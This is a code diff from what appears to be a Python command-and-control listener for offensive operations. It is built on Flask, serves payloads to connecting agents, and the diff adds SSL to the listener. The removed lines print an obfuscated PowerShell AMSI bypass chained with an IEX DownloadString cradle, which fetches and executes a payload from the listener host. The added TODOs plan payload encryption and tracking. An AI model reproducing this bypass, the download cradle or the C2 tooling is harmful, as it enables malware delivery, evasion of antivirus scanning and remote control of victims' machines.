@@ -13,6 +13,10 @@ from multiprocessing import Process
 from random import choice
 from string import ascii_uppercase
 
+#TODO: Get input for naming all url directory paths, then on generation of payload replace directories
+#TODO: Encrypt data & provide payload with key upon generation
+#TODO: Assign UUID to payload for generation & add a check under the reg variable
+
 class ListenerHTTP:    
 
     def __init__(self, name, port, ipaddress):
@@ -86,16 +90,9 @@ class ListenerHTTP:
             f.close()
             return (data, 200)
 
-        @self.app.route("/sc/<name>", methods=['GET'])
-        def sendScript(name):
-            amsi     = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
-            oneliner = "{}IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(amsi,self.ipaddress,str(self.port),name)
-        
-            return (oneliner, 200)
-
     def run(self):
         self.app.logger.disabled = True
-        self.app.run(port=self.port, host=self.ipaddress)
+        self.app.run(port=self.port, host=self.ipaddress, ssl_context=('./certs/cert.pem', './certs/key.pem'))
 
     def setFlag(self):
         self.flag = 1
